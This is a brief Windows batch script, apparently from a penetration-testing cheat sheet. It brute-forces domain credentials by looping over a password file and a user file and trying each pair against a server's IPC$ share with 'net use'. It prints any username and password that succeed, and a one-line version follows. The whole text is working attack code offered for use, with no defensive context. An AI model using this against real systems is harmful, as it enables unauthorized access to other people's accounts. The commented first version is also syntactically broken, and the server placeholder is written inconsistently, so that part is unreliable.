@FOR /F %p in (passw.txt) REM for each entry in passw.txt
DO @FOR /F %n in (listusers.txt) REM for each entry %n in listuers.txt
DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p REM if successful, show UI and PW
&& @net use /delete \\SERVERIP\IPC$ > NUL

REM 1 liner
@FOR /F %p in (passw.txt) DO @FOR /F %n in (listusers.txt) DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
